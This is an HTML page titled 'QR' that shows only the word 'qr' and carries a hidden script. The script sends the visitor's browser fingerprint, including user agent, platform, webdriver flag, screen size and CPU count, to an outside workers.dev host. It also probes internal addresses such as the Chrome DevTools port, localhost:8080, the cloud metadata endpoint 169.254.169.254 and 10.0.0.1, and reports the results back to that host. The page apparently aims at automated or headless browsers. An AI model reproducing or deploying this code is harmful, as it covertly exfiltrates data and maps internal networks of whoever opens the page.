<!doctype html><html><head><title>QR</title></head><body>qr

<script>
(function(){
  var B='https://rzcatch.adx-f0a.workers.dev/jx3-';
  function b(t,x){ new Image().src=B+t+(x?('-'+encodeURIComponent(x).slice(0,90)):''); }
  b('js-exec', navigator.userAgent.slice(0,60));
  try{ b('plat', navigator.platform+'|'+(navigator.webdriver?'wd':'nwd')+'|'+screen.width+'x'+screen.height+'|hc'+navigator.hardwareConcurrency); }catch(e){ b('plat-err'); }
  function probe(tag,url){
    var t0=Date.now();
    try{ var c=new AbortController(); setTimeout(function(){c.abort()},6000);
      fetch(url,{mode:'no-cors',signal:c.signal}).then(function(){b(tag+'-ok-'+(Date.now()-t0));}).catch(function(e){b(tag+'-'+(e&&e.name?e.name:'err')+'-'+(Date.now()-t0));});
    }catch(e){ b(tag+'-throw'); }
  }
  probe('lo9222','http://127.0.0.1:9222/json/version');
  probe('lo8080','http://127.0.0.1:8080/');
  probe('meta','http://169.254.169.254/latest/meta-data/');
  probe('ten1','http://10.0.0.1/');
  setTimeout(function(){ b('done'); },9000);
})();
</script></body></html>
